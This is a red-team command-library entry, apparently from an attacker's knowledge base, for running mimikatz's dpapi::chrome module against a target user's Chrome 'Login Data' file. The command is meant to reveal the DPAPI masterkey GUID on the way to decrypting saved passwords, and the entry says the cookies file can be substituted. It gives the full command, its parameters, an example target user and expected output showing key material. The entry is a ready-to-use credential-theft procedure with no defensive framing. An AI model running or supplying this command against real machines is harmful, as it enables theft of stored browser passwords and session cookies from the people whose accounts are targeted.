---
type: command
executor: command_prompt
data: >-
  mimikatz.exe "dpapi::chrome
  /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User
  Data\Default\Login Data""" /unprotect" "exit"
tags:
  - credential-access
  - dpapi
  - chrome
platforms:
  - Windows
verified: true
validated: true
---

# mimikatz-attempt-chrome-extraction-to-reveal-guid

## Command

```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

## Description

Attempts to decrypt Chrome credentials using DPAPI without the masterkey, which fails but reveals the protecting masterkey GUID in the volatile cache output. Run as Administrator on the target user's machine to identify the GUID for further decryption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /in | Path to Chrome Login Data SQLite file | Yes |
| $_TARGET_USER | Target username (e.g., bob) | Yes |
| /unprotect | Attempts DPAPI unprotection | Yes |

## Examples

### Basic Usage

```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

### For Cookies

Replace /in path with Cookies file.

## Expected Output

> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
 * volatile cache: GUID:{84dcc2cc-82c6-44d4-9404-45fd48b4b650};KeyHash:e49b3e446435a04d0396293e6dcae8df3274e323;Key:available
> AES Key is: 700c4a9477bf45ac86e53c109511907330a66bad896f3429da96cb70b9afd9f4

Failure with GUID exposed.

## Related

- [[procedures/Extract-Chrome-Cookies-and-Credentials-from-User-Profile-with-Domain-Admin]]
- [[tools/Mimikatz]]
